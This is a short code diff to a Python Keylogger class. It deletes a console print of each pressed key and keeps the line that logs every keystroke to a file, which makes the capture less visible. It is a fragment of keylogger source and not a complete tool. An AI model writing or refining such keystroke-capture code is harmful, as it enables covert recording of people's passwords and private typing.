@@ -14,7 +14,6 @@ class Keylogger:
 
     def on_key_pressed(self, key) -> bool:
         key = str(key).replace("'", "")
-        print("Pressed: " + key)
         self.file_manager.write_file(Constants.PATH_LOG, Constants.FILE_NAME_LOG, self.logger.create_log_message(Constants.LOG_MESSAGE_KEY_PRESSED + key))
         return True
    
